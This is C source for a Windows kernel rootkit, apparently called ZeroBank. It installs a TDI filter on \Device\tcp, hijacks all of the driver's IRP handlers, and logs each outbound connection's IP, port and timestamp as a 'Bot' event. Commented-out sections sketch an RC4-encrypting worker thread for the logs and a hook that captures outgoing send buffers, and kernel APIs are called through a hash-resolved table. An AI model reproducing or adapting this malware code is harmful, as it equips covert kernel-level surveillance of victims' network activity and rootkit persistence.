#include "common.h"


NTSTATUS g_rk_connect_filter(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	NTSTATUS st = STATUS_NOT_SUPPORTED;
	PIO_STACK_LOCATION pio = pIrp->Tail.Overlay.CurrentStackLocation;
	char buffer[1024] = { 0 };
	LARGE_INTEGER systime;
	LARGE_INTEGER lctime;
	TIME_FIELDS timer;
	PZERBANK_CRYPTOR_WORKER cryptorworker = NULL;

	__try
	{
		if (pio)
		{
			if (pio->MinorFunction == TDI_CONNECT && pio->MajorFunction == IRP_MJ_INTERNAL_DEVICE_CONTROL)
			{
				PTDI_REQUEST_KERNEL_CONNECT tdi_connect = (PTDI_REQUEST_KERNEL_CONNECT)(&pio->Parameters);
				if (tdi_connect)
				{
					PTA_ADDRESS address_data = ((PTRANSPORT_ADDRESS)(tdi_connect->RequestConnectionInformation->RemoteAddress))->Address;
					PTDI_ADDRESS_IP tdi_data = (PTDI_ADDRESS_IP)(address_data->Address);
					if (tdi_data)
					{
						unsigned int Address = tdi_data->in_addr;
						unsigned int Port = tdi_data->sin_port;				

						ROOTKIT_NETWORK_ADDRESS data = { 0 };
						data.ip[0] = ((char*)&Address)[0];
						data.ip[1] = ((char*)&Address)[1];
						data.ip[2] = ((char*)&Address)[2];
						data.ip[3] = ((char*)&Address)[3];


						data.Port[0] = ((char*)&Port)[1];
						data.Port[1] = ((char*)&Port)[0];
						Port = data.Port[1] * 0x100 + data.Port[0];

						KeQuerySystemTime(&systime);
						ExSystemTimeToLocalTime(&systime, &lctime);
						RtlTimeToTimeFields(&lctime, &timer);

						g_Hash._sprintf_s(buffer, 1024,"\r\n%02u-%02u-%04u %02u:%02u:%02u Bot connecting to [%d.%d.%d.%d:%d]",
							timer.Day,
							timer.Month,
							timer.Year,
							timer.Hour,
							timer.Minute,
							timer.Second,
							(unsigned int)data.ip[0], 
							(unsigned int)data.ip[1], 
							(unsigned int)data.ip[2],
							(unsigned int)data.ip[3],
							(unsigned int)Port);

						DbgPrint(buffer);
						

						// Log data to directory

						//LogFilterData(buffer);


						// allocate memory for worker routine

						//cryptorworker = (PZERBANK_CRYPTOR_WORKER)ExAllocatePool(NonPagedPool, sizeof(ZEROBANK_CRYPTOR_WORKER));
						//memset(cryptorworker, 0, sizeof(ZEROBANK_CRYPTOR_WORKER));
						//cryptorworker->Hash = &g_Hash;

						// Initialize cryptor worker routine,
						// this work routine will basically compress and encrypt the file
						// so we have a system thread which will be active only when user
						// connects to the internet, it will store the information in a log
						// and right after that our worker routine will start compressing and
						// crypting the file with RC4 algorithm

						//cryptorworker->StopWorkerThread = FALSE;

						//KiInitializeKernelModeThread(&cryptorworker->WorkerThreadHandle, 
													// &g_Hash, (PKSTART_ROUTINE)ZeroBankCryptorWorkRoutine, 
													// (PZERBANK_CRYPTOR_WORKER)cryptorworker);

					}
				}
			}
			/*else if (pio->MinorFunction == TDI_SEND && pio->MajorFunction == IRP_MJ_INTERNAL_DEVICE_CONTROL)
			{
				PCHAR pWriteDataBuffer = NULL;
				PCHAR buf = NULL;

				pWriteDataBuffer = (PCHAR)MmGetSystemAddressForMdlSafe(pIrp->MdlAddress, NormalPagePriority);
				if (pWriteDataBuffer != NULL)
				{
					__try
					{
						ULONG size = pio->Parameters.DeviceIoControl.OutputBufferLength;

						do
						{
							buf = (PCHAR)ExAllocatePool(NonPagedPool, size);
						} while (buf == NULL);

						memcpy(buf, pWriteDataBuffer, size);

						buf[size] = '\0';
						DbgPrint(buf);
						ExFreePool(buf);

					}
					__except (EXCEPTION_EXECUTE_HANDLER)
					{
						return GetExceptionCode();
						ExFreePool(buf);
					}
				}
			}*/
		}

	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return GetExceptionCode();
	}


	IoSkipCurrentIrpStackLocation(pIrp);
	st = g_Hash._IofCallDriver((PDEVICE_OBJECT)pDeviceObject->DeviceExtension, pIrp);

	return st;
}

NTSTATUS g_rk_connect_filter_thread(IN PVOID Context)
{
	PDEVICE_OBJECT pDeviceObject = NULL;
	UNICODE_STRING device = { 0 };
	NTSTATUS st;
	UINT16 i = 0;
	PZEROBANK_TDI_FILTER tdi = NULL;

	tdi = (PZEROBANK_TDI_FILTER)Context;

	st = tdi->Hash->_IoCreateDevice(tdi->pDriverObject, 
									sizeof(PDEVICE_OBJECT), 
									NULL, 
									FILE_DEVICE_UNKNOWN, 
									FILE_DEVICE_SECURE_OPEN, 
									FALSE,
									(PDEVICE_OBJECT*)&pDeviceObject);
	if (NT_SUCCESS(st))
	{
		for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		{
			tdi->pDriverObject->MajorFunction[i] = g_rk_connect_filter;
		}

		tdi->Hash->_RtlInitUnicodeString(&device, L"\\Device\\tcp");
		st = tdi->Hash->_IoAttachDevice(pDeviceObject, 
										&device, 
										(PDEVICE_OBJECT*)&pDeviceObject->DeviceExtension);
		if (NT_SUCCESS(st))
		{
			PDEVICE_OBJECT fltdriverobj = (PDEVICE_OBJECT)pDeviceObject->DeviceExtension;
			if (fltdriverobj)
			{
				pDeviceObject->Flags |= fltdriverobj->Flags &(DO_BUFFERED_IO | DO_DIRECT_IO);
				pDeviceObject->DeviceType = fltdriverobj->DeviceType;
				pDeviceObject->Characteristics = fltdriverobj->Characteristics;
				pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
			}
		}
	}

	tdi->Hash->_PsTerminateSystemThread(STATUS_SUCCESS);

	return st;
}

NTSTATUS g_rk_start_TDI_filter(IN PZEROBANK_TDI_FILTER tdi)
{
	NTSTATUS st;
	HANDLE handle;

	tdi->Stop = FALSE;
	tdi->Hash->_KeInitializeEvent(&tdi->Event, SynchronizationEvent, FALSE);

	st = tdi->Hash->_PsCreateSystemThread(&handle, THREAD_ALL_ACCESS, NULL, 0, NULL, g_rk_connect_filter_thread, (PVOID)tdi);
	if (!NT_SUCCESS(st))
		return st;
	
	st = tdi->Hash->_ObReferenceObjectByHandle(handle, THREAD_ALL_ACCESS, *PsThreadType, KernelMode, (PVOID*)&tdi->Ethread, NULL);

	ZwClose(handle);

	if (!NT_SUCCESS(st)) {
		tdi->Stop = TRUE;
		tdi->Hash->_KeSetEvent(&tdi->Event, 0, FALSE);
	}

	return st;

}